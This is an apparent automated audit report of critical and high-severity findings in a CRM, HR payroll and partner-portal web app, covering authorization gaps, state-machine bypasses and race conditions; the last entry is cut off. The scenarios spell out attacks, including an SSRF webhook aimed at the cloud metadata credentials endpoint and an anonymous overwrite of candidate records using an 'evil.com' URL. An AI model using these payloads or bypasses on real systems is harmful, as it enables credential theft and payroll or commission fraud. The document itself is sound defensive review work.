===== CRITICAL (26) =====
FILE: src/app/api/crm/opportunities/bulk/route.ts:201-322
SUM: Bulk set-stage bypasses canTransition matrix, required-loss-reason gate, and dateClosed/dateContacted side-effects — managers can mass-skip stages and close deals as LOST without a loss reason
SCEN: A MANAGER selects 50 opps in stages NEW..VERBAL_YES on /crm/opportunities, opens the bulk 'Set stage' dialog (added per Tier-0 #5), types 'LOST' and clicks Apply. The bulk handler validates stageCfg is active and source-stage required-fields, then writes stage=LOST + dateClosed=now in a tx. It never calls canTransition (single-opp changeStage uses it at actions.ts:645), so LOST→LOST or back-jumps 
---
FILE: src/app/(dashboard)/crm/opportunities/actions.ts:47-66 + src/lib/crm/business/pipeline.ts:23-48
SUM: Two divergent STAGE_DEFAULT_PROBABILITY maps — single-opp changeStage and bulk set-stage compute different weightedValueEGP for the same stage when no CrmStageConfig row exists
SCEN: Fresh tenant with no CrmStageConfig rows for entity X. A REP moves opp via the detail-page modal (single path → getStageProbability in actions.ts uses {NEW:5, CONTACTED:15, DISCOVERY:30, QUALIFIED:50, TECH_MEETING:60, PROPOSAL_SENT:75, NEGOTIATION:85, VERBAL_YES:95}). A MANAGER bulk-moves another batch via /api/crm/opportunities/bulk (set-stage → pipeline.ts getStageProbability uses {CONTACTED:10,
---
FILE: super-app/src/app/api/crm/cold-leads/[id]/convert/route.ts:115-128
SUM: Cold-lead → opportunity conversion assigns the new opportunity to the converter, not the lead's rep.
SCEN: MANAGER (or ADMIN) opens a cold lead currently assigned to rep Sara and clicks 'Convert to opportunity'. The convert route calls createOpportunity({...}) WITHOUT passing ownerId. Inside createOpportunity (opportunities/actions.ts:182), resolvedOwnerId defaults to session.id which is the MANAGER's crmProfileId. The new CrmOpportunity is saved with ownerId=MANAGER instead of ownerId=Sara.
---
FILE: super-app/src/app/api/crm/pipeline/route.ts:142-250
SUM: PATCH /api/crm/pipeline (drag-drop) skips the required-fields gate that changeStage() enforces — reps can drag deals out of a stage even when admin marked required fields as missing.
SCEN: Admin opens /crm/admin/stage-config → Advanced for stage NEW → checks 'Estimated value' + 'Next action date' as required-to-leave. A REP opens /crm/pipeline and drags a NEW opp (with empty estimatedValue and null nextActionDate) into CONTACTED. The PATCH endpoint never reads CrmStageConfig.requiredFieldsJson for the source stage; it only validates the target stage exists. The move succeeds. The sa
---
FILE: super-app/src/app/api/crm/pipeline/route.ts:176-193
SUM: PATCH /api/crm/pipeline does not call canTransition() — drag-drop bypasses the stage-machine rules (no resurrect-from-WON, no skip-more-than-2-stages, no Postponed→Won direct jump).
SCEN: A MANAGER opens the kanban. There is a WON opp in the WON column. They drag it into NEW. The PATCH handler only checks (a) target stage exists in CrmStageConfig and (b) source !== target. canTransition('WON', 'NEW') returns { allowed: false, error: 'Cannot transition from a terminal stage' } in lib/crm/business/stage-transitions.ts:59-61, but the handler never calls it. The opp is moved from WON →
---
FILE: super-app/src/app/api/crm/sales-board/route.ts:107-138
SUM: Sales-board per-rep table groupBy ignores all filters and soft-deletes — every rep sees full org pipeline counts.
SCEN: Any user (REP included, after the role gate at line 22-24 is satisfied) hits GET /api/crm/sales-board?companyId=X&productId=Y&repId=Z. The `repOpps` groupBy at line 107-110 (`db.crmOpportunity.groupBy({ by: ['ownerId','stage'], _count: { _all: true } })`) has NO `where` clause, so it ignores oppScope (companyId, productId, repId) AND `deletedAt: null`. The repTable on the sales-board client (lines
---
FILE: super-app/src/app/(dashboard)/crm/group/data.ts:52-77
SUM: Group dashboard openOpps/wonOpps queries don't filter `deletedAt: null` — soft-deleted opps inflate every KPI on /crm/group, /forecast, /health, /leaderboard.
SCEN: Any user that reaches /crm/group (and the related forecast/health/leaderboard pages) triggers `getGroupDashboardData`. The two findMany calls at lines 52-77 spread `...scope` and `...entityFilter` but never include `deletedAt: null`. The schema docstring (prisma/schema.prisma:2770) explicitly mandates 'Every findMany query must filter deletedAt: null'. Result: a manager who soft-deletes a duplicat
---
FILE: super-app/src/app/api/hr/payroll/monthly/recalculate/route.ts:7-32
SUM: Monthly recalculate endpoint never checks period.status — overwrites LOCKED, FINALIZED, or PAID salary rows.
SCEN: After accountant marks 06/2026 payroll for company X as PAID, an hr_manager (or even the accountant) clicks 'Recalculate' on the monthly payroll page (super-app/src/app/(dashboard)/hr/payroll/monthly/page.tsx:226-235 keeps the button enabled in every status). The route calls calculateCompanyPayroll() which does prisma.hrMonthlySalary.upsert(...) (payroll-engine.ts:178-216) without filtering by sta
---
FILE: super-app/src/app/api/hr/payroll/periods/[id]/route.ts:43-92
SUM: PATCH /payroll/periods/[id] accepts an arbitrary status string with no state-machine validation, and DELETE wipes the period regardless of status.
SCEN: An accountant (canManagePayroll) PATCHes a finalized or paid period back to status='open' (updatePayrollPeriodSchema in validations/payroll.ts only requires a string), or sends DELETE on a paid period. updateData.status is shoved straight into prisma.hrPayrollPeriod.update, and DELETE has no guard.
---
FILE: super-app/src/app/api/hr/jobs/[slug]/apply/route.ts:48-69
SUM: Public apply endpoint upserts the Candidate row by email, allowing an anonymous attacker to overwrite a real candidate's name/phone/resume URL with just their email address.
SCEN: Attacker visits the public application page for any open job. They know a target candidate's email (e.g. ceo@bgroup.com). They submit fullName='SPAM', phone='555-FAKE', resumeUrl='http://evil.com/cv.pdf' along with the target email. db.candidate.upsert({ where: { email }, update: { fullName, phone, resumeUrl } }) overwrites the existing Candidate record's fullName/phone/resumeUrl in update. The sa
---
FILE: super-app/src/app/api/hr/incidents/route.ts:251 + super-app/src/lib/hr/validations/incident.ts:9
SUM: Incident create accepts client-supplied status, allowing an HR manager (or anyone who reaches the POST) to file an incident already 'applied' or 'dismissed', bypassing the resolve approval workflow.
SCEN: An HR Manager POSTs to /api/hr/incidents/ with body { employee, violation_rule, incident_date, status: 'applied' }. createIncidentSchema declares status: z.string().optional() (no enum) so it passes validation, and the route writes status: data.status || 'pending' directly into the row. The dedicated /[id]/resolve/route.ts (which gates on status==='pending' and supports dismiss vs apply) is skippe
---
FILE: super-app/src/app/api/hr/attendance/logs/route.ts:104-120
SUM: POST /attendance/logs accepts hours_worked and overtime_hours from the client with no upper bound and no payroll-period lock check, letting any HR manager write fabricated payable hours for any employee in any company.
SCEN: HR Manager of Company A POSTs { employee: <Company B employee id>, date: '2026-05-15', hours_worked: 24, overtime_hours: 16, manual_reason: '' } to /api/hr/attendance/logs/. isHROrAdmin passes (no company scope check on the employee). hoursWorked and overtimeHours are written directly from the body. There is no validation that hours_worked relates to check_in/check_out, no upper bound, and no chec
---
FILE: super-app/src/app/api/hr/overtime/bulk-approve/route.ts:34-37
SUM: Bulk-approve flips OT requests to 'approved' without ever computing calculatedAmount — approved OT items remain at the create-time value of 0, so payroll owes nothing for any bulk-approved OT.
SCEN: POST /api/hr/overtime/requests/ creates rows with calculatedAmount: 0 (route.ts:168). The single-request approve (requests/[id]/approve/route.ts:34-47) computes hours * multiplier * (baseSalary / 30 / dailyWorkHours) and writes it back. But the bulk-approve handler does updateMany({ where: { id in ids, status pending }, data: { status: 'approved', approvedById, approvedAt } }) with no calculation.
---
FILE: super-app/src/app/api/partners/deals/[id]/route.ts:30-101
SUM: Partner can self-mark their own deal as WON and mint commission rows without any admin approval
SCEN: Partner user (session.user.partnerId set, modules includes 'partners') sends PATCH /api/partners/deals/<own-deal-id> with body {status:'WON', value: 9999999}. requirePartnerAuth + assertAccess pass because the deal.partnerId == user.partnerId. The route has NO isAdmin check on the status transition; it enters the WON branch, flips the deal, and writes a PartnerCommission row at the partner's curre
---
FILE: super-app/src/app/api/partners/deals/[id]/route.ts:103-111
SUM: Partner can mutate `value`/`notes` of an already-WON deal; commission row is not recomputed, so deal.value and commission.amount drift apart
SCEN: After WON, the existing.status === 'WON' branch is skipped and the route falls through to the generic update at line 104, which still accepts `value` from updateDealSchema. Partner X PATCHes their own WON deal with {value: 50}, having originally WON it at value 1000 with a $100 commission. The deal row updates to value=50 but PartnerCommission.amount stays at $100. There is no business-rule check,
---
FILE: super-app/src/app/(dashboard)/partners/admin/contracts/page.tsx:42-45
SUM: Admin contract approve/reject UI sends `{status}` but server expects `{action}` — every review request 400s and the catch block swallows the error, so buttons silently do nothing
SCEN: Platform admin opens /partners/admin/contracts, clicks Approve on a REQUESTED contract. handleReview posts PATCH /api/partners/contracts/<id>/review with body {status:'APPROVED', rejectionReason: undefined}. The API parses with reviewContractSchema (super-app/src/lib/partners/validations.ts:110-113) which expects {action:'APPROVED'|'REJECTED', rejectionReason?:string}. safeParse fails ('Required')
---
FILE: super-app/src/app/api/partners/invoices/route.ts:38-78 + super-app/src/lib/partners/validations.ts:117-120
SUM: Partner-supplied invoice `amount` has no upper bound and no relation to deal.value enforcement; partner can request a $9,999,999 invoice on a $10 deal
SCEN: Partner with one WON deal worth $10 sends POST /api/partners/invoices {dealId:<own>, amount:9999999}. requestInvoiceSchema is z.object({dealId, amount: z.number().min(0).optional()}) — no max, no compare to deal.value. Route accepts and creates a PartnerInvoice with that amount. The admin UI shows the inflated amount with no indication it exceeds deal.value, and the same admin review endpoint just
---
FILE: super-app/src/app/api/account/change-password/route.ts:33-77
SUM: Impersonating admin can change the TARGET user's password via the self-service change-password endpoint
SCEN: Platform admin (super_admin) opens /admin/impersonate, picks target user X, then -- while the impersonation banner shows them acting as X -- navigates to /account/change-password and submits the form. The route reads session.user.id (which is X's id during impersonation, set by auth.ts line 539 `session.user.id = token.userId`). The current-password check at line 64 compares the supplied password 
---
FILE: super-app/src/app/api/admin/impersonate/route.ts:42-92
SUM: Nested impersonation possible when the target itself is super_admin, and audit trail is forged to the target's id
SCEN: Admin A impersonates target X. X happens to also have hrRoles `super_admin` (e.g. another super-admin, or a CEO who carries the role). After the JWT swap, session.user.id = X, session.user.hrRoles = [`super_admin`]. Admin A (still controlling the session) hits POST /api/admin/impersonate with userId = Y. isPlatformAdmin(session) returns true because session.user.hrRoles includes super_admin. The e
---
FILE: super-app/src/app/api/partners/deals/[id]/route.ts:30-101
SUM: Partner can self-approve their own deal as WON and auto-create commission row at any value
SCEN: A regular partner (PARTNER role, has partnerId) calls PATCH /api/partners/deals/<theirDealId> with body { status: 'WON', value: 999999999 }. `requirePartnerAuth` only verifies partners-module membership; `assertAccess(user, existing.partnerId)` returns true because they own the deal. The route then enters the WON-transition branch and writes partnerCommission.create({ amount: 999999999 * rate/100 
---
FILE: super-app/src/app/api/hr/payroll/monthly/finalize/route.ts:8-86
SUM: Accountant can finalize and mark-paid payroll for any company, not just companies they belong to
SCEN: An accountant in Company A (BGroup) POSTs /api/hr/payroll/monthly/finalize with body { company: '<companyB_id>', month: 6, year: 2026 }. `canManagePayroll` (lib/hr/permissions.ts:35-37) allows super_admin/hr_manager/accountant globally — no `authUser.companies.includes(companyId)` check. Same pattern in /payroll/calculate/route.ts and /payroll/monthly/{lock,mark-paid}/route.ts.
---
FILE: super-app/src/app/api/hr/overtime/bulk-approve/route.ts:13-58
SUM: HR manager / super_admin bulk-approves overtime requests with no company-scope filter on the ids
SCEN: An hr_manager for Company A POSTs { ids: ['<overtime_req_from_companyB>', ...] } to /api/hr/overtime/bulk-approve. `isHROrAdmin` passes them. `updateMany({ where: { id: { in: ids }, status: 'pending' } })` has NO company filter, so cross-company overtime requests get approved with `approvedById: authUser.id`. Same pattern (no companyId filter) on /api/hr/bonuses/[id]/approve, /api/hr/incidents/[id
---
FILE: super-app/src/app/api/hr/attendance/leave-requests/[id]/approve/route.ts:20-72
SUM: Leave approval is non-atomic — concurrent HR approvals double-write attendance logs and crash mid-fan-out.
SCEN: An HR manager and a super_admin both click 'Approve' on a 5-day leave request at the same time. Both pass the `if (lr.status !== 'pending')` check at line 26 (read-then-update with NO updateMany gate, NO surrounding $transaction). Both then enter the day-loop at line 44 inserting `hrAttendanceLog` rows. The second one hits the `employeeId_date` unique constraint mid-loop on day 1 and throws — but 
---
FILE: super-app/src/app/api/hr/overtime/bulk-approve/route.ts:34-46
SUM: Bulk-approve overtime sets calculatedAmount to 0 — approved OT pays nothing.
SCEN: HR manager selects 50 pending overtime requests in the table and clicks 'Bulk approve'. The route calls `prisma.hrOvertimeRequest.updateMany` and only writes `status: 'approved'`, `approvedById`, `approvedAt`. The `calculatedAmount` field was created with value 0 in `super-app/src/app/api/hr/overtime/requests/route.ts:168` and is never recomputed here — unlike the single-row approve at `super-app/
---
FILE: super-app/src/app/api/partners/leads/[id]/convert/route.ts:15-50
SUM: Lead-to-client conversion has TOCTOU — concurrent converts create orphan clients and silently overwrite the converted link.
SCEN: Partner A double-clicks the 'Convert to client' button on a lead. Both requests pass `if (lead.convertedToClientId)` at line 20 (the check is OUTSIDE the $transaction). Both enter the transaction, both `tx.partnerClient.create({...})` succeed — there is no uniqueness constraint that would block a second create — and both then `tx.partnerLead.update` setting `convertedToClientId`. The second write 
---
FILE: super-app/src/lib/workflows/actions.ts:79-108
SUM: Workflow `webhook` action URL allows SSRF — only `z.string().url()`, no private-IP / scheme block
SCEN: A platform admin creates a workflow at POST /api/admin/workflows with a step `{ kind: "webhook", config: { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" } }`. WebhookConfig in actions.ts only enforces `z.string().url()`. The route's per-step validator (`action.config.safeParse`) passes. When the trigger fires, `execute()` calls `fetch(config.url, …)` server-side against 
---
===== HIGH (96) =====
FILE: src/app/(dashboard)/crm/opportunities/actions.ts:735-749
SUM: WON depositAmount + depositDate are accepted by the schema and modal but never persisted; transition requirement marks them required while action drops them
SCEN: REP drags an opp to WON in kanban; StageChangeModal opens, getTransitionRequirements returns depositRequired:true so the deposit amount/date/contract URL inputs render. Rep fills 'depositAmount: 50000, depositDate: 2026-06-10, contractUrl: https://…' and confirms. Client calls changeStage with depositAmount + depositDate in stageChangeSchema, server validates them (lib/crm/validations/opportunity.
---
FILE: src/app/api/crm/opportunities/[id]/contact/route.ts:60-72
SUM: Contact PATCH endpoint nulls out all three fields when only one is sent — fires every time the inline Contacts card saves
SCEN: On opp detail page, the inline ContactCard sends a PATCH with all three fields (name/phone/email). But if any other surface PATCHes only one — e.g. a future quick-edit dropdown sends `{ customerContactName: 'Sara' }` — the handler at line 63-65 does `parsed.data.customerContactPhone ?? null`. Since the schema marks phone as `.nullable().optional()`, an absent key yields undefined and `undefined ??
---
FILE: src/components/crm/opportunities/OpportunityIntelligence.tsx:218-221 + src/app/api/crm/opportunities/[id]/close-plan/route.ts:99-138
SUM: Close-plan item toggle silently overwrites ownerSide/orderIndex/notes on every check-tick
SCEN: Rep adds a close-plan item: title='Security review', ownerSide='them', dueDate='2026-07-01', orderIndex=3, notes='Anish leading'. Later they tick the checkbox to mark it done. toggleItem at OpportunityIntelligence.tsx:218-221 calls upsertItem with only {id, title, status:'done'}. The server schema (close-plan/route.ts:33-41) treats all those fields as optional, then in POST line 110-116 applies de
---
FILE: src/components/crm/opportunities/OpportunityKanban.tsx:50-79
SUM: Kanban view only shows the current page's 50 opps — drag-drop is impossible for any opp on page 2+
SCEN: Tenant with 200 opps. User switches to kanban view on /crm/opportunities. The page server-loads only page 1 (50 rows) via getOpportunities (page.tsx:23 with pageSize=50). OpportunityListClient passes those 50 opps to OpportunityKanban (line 507). The kanban displays the 50-row subset in stage columns. Opps on pages 2–4 are invisible in the kanban; there's no pagination control in kanban mode. Wors
---
FILE: src/app/api/crm/opportunities/[id]/trigger-workflow/route.ts:34-76
SUM: trigger-workflow has no opportunity-scope check and contradicts its own role gate — any MANAGER can start a workflow on any opp regardless of visibility
SCEN: A MANAGER guesses or scrapes the id of an opp owned by another team. POSTs /api/crm/opportunities/[id]/trigger-workflow with any workflowId. isSalesManager returns true (MANAGER || ADMIN — comment says 'not the platform admin, not the CRM admin' but the code allows ADMIN, so the error message at line 49 is a lie). findFirst at line 65 only filters by deletedAt:null — no scopeOpportunityByRole. The
---
FILE: src/app/api/crm/opportunities/transfer/route.ts:31-79
SUM: Bulk transfer endpoint skips scopeOpportunityByRole and accepts soft-deleted-but-not-yet-loaded ids on race — owner of moved opps lose audit attribution when MANAGER scope tightens
SCEN: Endpoint relies entirely on canTransfer (MANAGER/ADMIN/super_admin) for authorization. opps lookup at line 69 only filters by id + deletedAt:null — no scope. Today MANAGER scope is `{}` so behaviour is benign, but the scope helper file (lib/crm/rbac.ts:6-15) documents the previous team-scoped MANAGER model and the comment 'reverted because…' implies a future re-tightening is possible. If that flip
---
FILE: super-app/src/app/api/crm/cold-leads/[id]/disposition/route.ts:29-86
SUM: Disposition API will accept NO_ANSWER / WAITING_LIST / NOT_INTERESTED on a CONVERTED or ARCHIVED lead.
SCEN: Lead L was converted yesterday — status=CONVERTED, convertedOpportunityId=opp_xyz. The assigned rep (or any manager/admin) POSTs /api/crm/cold-leads/L/disposition { disposition: 'NOT_INTERESTED' }. The handler only checks ownership; it never reads lead.status or lead.convertedOpportunityId. The transaction sets status='NOT_INTERESTED', lastDispositionAt=now, recycleEligibleAt=null, and inserts a d
---
FILE: super-app/src/app/api/crm/cold-leads/redistribute/route.ts:62-92
SUM: redistribute (both repIds-mode and resetStatus-mode) flips CONVERTED leads back to ASSIGNED / NEW without clearing convertedOpportunityId.
SCEN: Manager selects CONVERTED leads from any bucket (the bulk action bar in client.tsx allows it — there is no status filter on selection) and clicks 'Send back to pool' → POST /redistribute { leadIds, resetStatus: true }. The updateMany blindly sets status='NEW', assignedToId=null. The lead is now in the unassigned pool while still referencing an opportunity, so the rep who picks it up cannot re-conv
---
FILE: super-app/src/app/api/crm/cold-leads/[id]/convert/route.ts:78-128
SUM: Convert TOCTOU loser orphans a CrmContact (and sometimes CrmCompany), and the loser usually 500s on the title-unique pre-check rather than reaching the soft-archive guard.
SCEN: Two concurrent POSTs to /convert on lead L. Both pass the early convertedOpportunityId==null gate. Both build companyName=L.companyName, both find-or-create the same CrmCompany (race here may produce two duplicate CrmCompany rows because findFirst+create is non-atomic and there is no unique index enforced on nameEn). Both insert a CrmContact for L.name. Both call createOpportunity, which computes 
---
FILE: super-app/src/app/api/crm/cold-leads/distribute/route.ts:60-77
SUM: distribute accepts CONVERTED leads and uses Promise.all parallel updates without a transaction.
SCEN: Manager has CONVERTED rows visible in the bucket=ALL list and ticks one by mistake along with 200 NEW rows, then clicks Distribute. The handler does not filter by status; it issues 201 parallel db.crmColdLead.update calls. The CONVERTED row gets assignedToId=newRep, status='ASSIGNED', leaving convertedOpportunityId pointing at the live opp. If the DB drops one of the 201 mid-flight, Promise.all ab
---
FILE: super-app/src/app/api/crm/cold-leads/[id]/route.ts:91-167
SUM: PATCH admin override lets a manager set status=CONVERTED without a linked opportunity, and lets them leave assignedToId set when status=NEW.
SCEN: (a) Manager opens Edit dialog and picks Status=Converted in the 'Admin overrides' panel (client.tsx:1003-1010) for a lead with no opp. The PATCH sends { status: 'CONVERTED' }. Server schema accepts CONVERTED (line 50) and writes it. convertedOpportunityId remains null, so the lead appears in the CONVERTED bucket but no opp exists. Subsequent DELETE is allowed (lead.convertedOpportunityId is null),
---
FILE: super-app/src/app/api/crm/cold-leads/[id]/convert/route.ts:39-42 + super-app/src/app/(dashboard)/crm/cold-leads/[id]/convert/page.tsx:37-41
SUM: Convert flow has no status guard — ARCHIVED / NOT_INTERESTED leads can be converted by hitting the URL directly.
SCEN: Lead L is in ARCHIVED state (manager pressed Archive on the bulk bar). A rep who used to be assigned navigates directly to /crm/cold-leads/L/convert. page.tsx checks only lead.convertedOpportunityId, not lead.status. The convert API does the same. The conversion proceeds, creating an opportunity from an archived row — bypassing the disposition-state-machine entirely.
---
FILE: super-app/src/app/(dashboard)/crm/cold-leads/page.tsx:21-22 + super-app/src/app/(dashboard)/crm/cold-leads/[id]/convert/page.tsx:37-41
SUM: Page-level isManagerOrAdmin uses crmRole only; platform super_admin / partners-admin are demoted to REP in the UI.
SCEN: A user logs in as platform super_admin with NO CRM role assigned (crmRole=null). They navigate to /crm/cold-leads. Line 22 evaluates isManagerOrAdmin=false. The client hides Import, Folders view, Distribute, bulk-delete, EditLeadDialog admin overrides, and the rep filter — yet the APIs (distribute / redistribute / bulk-delete / folders / import / [id] PATCH) accept them via isPlatformAdmin() in ad
---
FILE: super-app/src/app/api/crm/pipeline/route.ts:213-244
SUM: PATCH /api/crm/pipeline writes CrmStageHistory but NOT CrmActivityLog — drag-drop moves never appear in the opportunity activity-log feed.
SCEN: A rep drags an opp from CONTACTED to DISCOVERY. The transaction at line 213-233 writes a CrmStageHistory row but no CrmActivityLog 'stage_changed' row. Compare to changeStage() at actions.ts:776-788 which writes both. Compare to the bulk endpoint at bulk/route.ts:297-305 which also writes stage history but skips activity log — same omission. Anyone reading the opp's activity feed (/crm/opportuniti
---
FILE: super-app/src/app/api/crm/pipeline/route.ts:209-233
SUM: PATCH /api/crm/pipeline does not stamp dateContacted / dateDiscovery / dateProposalSent on stage transitions, so first-touch SLA reports drift.
SCEN: Rep drags an opp into PROPOSAL_SENT via the kanban. PATCH only sets dateClosed when moving to WON/LOST. The single-opp changeStage() at actions.ts:746-757 sets dateProposalSent / dateContacted / dateDiscovery on those transitions. So an opp first proposed via drag-drop has proposalUrl unchanged AND dateProposalSent still null — reports that use dateProposalSent to compute 'days from proposal to cl
---
FILE: super-app/src/lib/crm/validations/admin.ts:82-95
SUM: createStageConfigSchema hardcodes the 11 seed stage codes — admins literally cannot add the 'PILOT' / 'FIELD_TRIAL' stages that the pipeline client + STAGE_HUE_PALETTE claim to support.
SCEN: Admin opens /crm/admin/stage-config. The schema's `stage: z.enum([NEW, CONTACTED, ..., LOST])` whitelist (lines 83-95) hard-rejects any code outside the 11 seeds. The client UI's ALL_STAGES at stage-config-client.tsx:41-53 likewise only offers those 11. Yet pipeline/client.tsx:88-103 advertises hueFor() fallback 'for admin-added stages (e.g. FIELD_TRIAL, PILOT)' and the schema comment at schema.pr
---
FILE: super-app/src/app/api/crm/pipeline/route.ts:209-223
SUM: closesDeal check hardcodes 'WON' / 'LOST' but stage codes are now admin-configurable — renamed/aliased close stages won't set dateClosed.
SCEN: An admin (intent: localise / rebrand) creates a stage 'CLOSED_WON' as the new terminal stage and hides 'WON' via deleteStageConfig. (Currently blocked by the schema enum — but if the team relaxes the enum per the next-fix-item, this surfaces.) Even with the seeds: code at line 209 `const closesDeal = newStage === 'WON' || newStage === 'LOST'`. If the admin localises and creates stage code 'WON_DEA
---
FILE: super-app/src/app/api/crm/stages/route.ts:38-66
SUM: /api/crm/stages returns stage configs across ALL entities with no entity filter — multi-entity tenants leak each other's stage labels and orders into the kanban.
SCEN: System has two entities (BGroup + a future second entity, per the multi-entity comment at route.ts:24). Admin of entity-B sets customLabelEn='Trial' and displayOrder=2 for stage 'TECH_MEETING' with entityId='B-id'. A user belonging to entity A loads /crm/pipeline. The route findMany({ isActive: true }) ignores both the caller's session.user.crmEntityId and any entityId on the row. The dedupe-by-st
---
FILE: super-app/src/app/api/crm/opportunities/[id]/comments/route.ts:117-126,178-194
SUM: Mentioned users are not scope-checked against the opportunity — REP in entity A can fan a notification to a REP in entity B who cannot see the opp
SCEN: REP-A in entityId=A opens an opp they own. They open the @ picker (mentionable endpoint returns ALL active CRM profiles, see file super-app/src/app/api/crm/users/mentionable/route.ts:37-58 — no entity scope), pick REP-B from entityId=B, and submit. The POST handler only filters `active: true` (line 124) and creates CrmNotification rows for REP-B regardless of REP-B's scopeOpportunityByRole on this
---
FILE: super-app/src/app/api/crm/opportunities/[id]/comments/route.ts:113-149
SUM: Raw cuid leaks into notification preview when a mentioned profile is inactive/missing OR when the author self-mentioned
SCEN: Author types `@<selfId> hey @<otherId>`. Line 115 strips self from mentionIds, so `validMentions` only contains otherId — `nameByProfileId` has no entry for self. The regex on line 145 matches `@<selfId>`, calls `nameByProfileId.get(selfId)` which is undefined, falls through and returns `full` (the literal `@<selfcuid>`). The CrmNotification.message stored for otherId becomes `@clx1a2b3c4...selfcu
---
FILE: super-app/src/components/crm/opportunities/OpportunityComments.tsx:74-105
SUM: Self-mention tokens render as raw cuid chips in the thread because server strips the self-mention from the mentions[] array
SCEN: REP authors a comment containing their own `@<self-id>` token (e.g. quoting an earlier post or using @-as-self-tag). The POST handler de-dupes/drops self (route.ts:115), so the resulting comment.mentions array DOES NOT include the author. renderBody (lines 74-89) builds `byId` from `mentions`, finds no entry for the self id, and pushes the raw match string `@<selfcuid>` into parts. The thread show
---
FILE: super-app/src/app/(dashboard)/crm/admin/dashboards/client.tsx:140-151
SUM: SpecificPeoplePicker is hard-capped at 200 active CRM users with client-side filter only — admins literally cannot share with the 201st user.
SCEN: CRM ADMIN opens /crm/admin/dashboards, clicks 'New dashboard', picks 'Specific people'. The client fires a one-shot `fetch('/api/crm/users/mentionable?q=&take=200')` on mount (line 141). The mentionable endpoint hard-caps `take` to 200 (route.ts:32-35) and never paginates. The search input in the picker filters the already-loaded array CLIENT-SIDE (client.tsx:538-546), so typing 'zahra' on the 250
---
FILE: super-app/src/app/(dashboard)/crm/admin/dashboards/client.tsx:146-150,582-587
SUM: Roster fetch failure is swallowed silently and the picker shows 'Loading users…' forever, masking a hard failure as an in-progress state.
SCEN: If `/api/crm/users/mentionable?q=&take=200` returns 500 or the network blips, the `.catch(() => {})` at line 146-150 swallows the error and leaves `users` as `[]`. The user opens 'Specific people' mode; the SpecificPeoplePicker renders the empty-state message at line 582-587: `users.length === 0 ? 'Loading users…' : 'No users match the filter.'`. Since `users` stays at `[]` indefinitely, the admin
---
FILE: super-app/src/app/(dashboard)/crm/reports/client.tsx:483-505 + super-app/src/app/api/crm/calls/route.ts:71-82
SUM: Daily-report drill-down sends repId/from/to to /api/crm/calls but the GET handler ignores all three, so the dialog shows the wrong calls
SCEN: MANAGER opens the Daily Reports page, clicks Sara's row for 2026-05-19. ReportDetailDialog fires `GET /api/crm/calls?repId=<sara.id>&from=2026-05-19T00:00:00.000Z&to=2026-05-20T00:00:00.000Z`. The route only reads `dateFrom`/`dateTo`/`outcome`/`callType`/`search` from the query string — `from`, `to`, and `repId` are silently dropped. getCalls() then runs with no date filter and only the manager's 
---
FILE: super-app/src/app/api/crm/meetings/[id]/deny/route.ts:20-71
SUM: Meeting deny endpoint has no status guard and no scope check — any ASSISTANT can DENY an already-APPROVED or DONE meeting org-wide
SCEN: An ASSISTANT (any one, in any entity) calls `POST /api/crm/meetings/<id>/deny` with `{ reason: "oops" }` for a meeting that is in state APPROVED, CONFIRMED, or even DONE. canDeny() only checks role. The route loads the meeting, only blocks the case where the assistant booked it themselves, then unconditionally `db.crmMeeting.update` writes `status: 'DENIED'`, `approvedById: null`, `approvedAt: nul
---
FILE: super-app/src/app/api/crm/meetings/[id]/approve/route.ts:21-73
SUM: Approve endpoint has no scope check — any ASSISTANT can approve any meeting org-wide regardless of relationship
SCEN: ASSISTANT in Entity A calls `POST /api/crm/meetings/<meeting-from-entity-B>/approve`. canApprove() only checks role membership; there is no call to loadOrError() and no entityId check. The route only blocks self-approval (scheduledById === ownProfile). Approve writes `approvedById: session.user.crmProfileId`, which then per scopeOpportunityByRole(ASSISTANT) GRANTS the assistant subsequent read acc
---
FILE: super-app/src/app/api/crm/meetings/route.ts:197-223
SUM: Product/slot overlap exclusion is keyed on raw `customerNeed` equality, so case/whitespace variants slip past
SCEN: Rep A books a slot 10:00–11:00 with customerNeed `'POS Systems'`. Rep B then books the same 10:00–11:00 with customerNeed `'pos systems'` (lower-case) or `' POS Systems'` (leading space — note the Zod .trim() runs before the check but the existing row's stored value may not match). Prisma's `customerNeed: data.customerNeed` is a case-sensitive equality with no `mode: 'insensitive'`. The conflict q
---
FILE: super-app/src/app/api/crm/meetings/[id]/route.ts:125-149
SUM: PATCH (reschedule) overlap exclusion is inconsistent with POST: DENIED meetings block reschedules but free the slot on create; product conflicts aren't re-checked at all
SCEN: REP reschedules their own meeting M1 from 10:00 to 11:00 via PATCH. At 11:00 there's an old DENIED meeting M0 the rep had previously booked. POST uses `status: { notIn: ['CANCELLED', 'DENIED'] }` (DENIED frees the slot), but PATCH uses `status: { not: 'CANCELLED' }` — DENIED still blocks. The rep gets a 409 'Time slot conflicts with M0' for a slot that POST would consider free. Worse, PATCH never 
---
FILE: super-app/src/app/api/crm/meetings/route.ts:44-99
SUM: GET /api/crm/meetings exposes contact phone, notes, customerNeed, and deniedReason of every meeting org-wide to any CRM user
SCEN: A REP issues `GET /api/crm/meetings?scope=all` (the default; the calendar UI also passes scope=all). The route applies NO role-based filter to the columns: Prisma `findMany` with `include` returns ALL scalar fields of CrmMeeting — `contactPhone`, `contactName`, `customerNeed`, `notes`, `deniedReason` — for up to 500 meetings across every entity. The stated reason for org-wide visibility (line 58-6
---
FILE: super-app/src/app/(dashboard)/crm/group/page.tsx:7-23 + forecast/health/leaderboard/page.tsx
SUM: /crm/group and child pages have no role gate — a REP can navigate to the group dashboard, forecast and leaderboard and see every other rep's pipeline.
SCEN: rbac.ts line 107-109 says `/group` should be ADMIN+MANAGER only via `canAccessRoute`. But none of `super-app/src/app/(dashboard)/crm/group/page.tsx`, `.../forecast/page.tsx`, `.../health/page.tsx`, `.../leaderboard/page.tsx` actually CALL `canAccessRoute` — they just `getRequiredSession()` and render. `proxy.ts` (line 306-341) only blocks ASSISTANT for `/crm/group/**`. A REP typing the URL `/crm/g
---
FILE: super-app/src/app/api/saved-views/[id]/route.ts:37-54
SUM: PATCH on saved-view lets a non-admin promote their own view to `isShared: true`, bypassing the POST-time admin gate.
SCEN: POST /api/saved-views (route.ts:101-115) gates `isShared` behind an `isAdmin` check — a REP can create a private view but cannot set `isShared: true`. PATCH at [id]/route.ts:50 has NO such gate: `...(parsed.data.isShared !== undefined && { isShared: parsed.data.isShared })`. A REP creates a view with `isShared: false`, then PATCHes `{ isShared: true }`. The PATCH only verifies `view.userId === ses
---
FILE: super-app/src/app/api/saved-views/[id]/route.ts:16-71
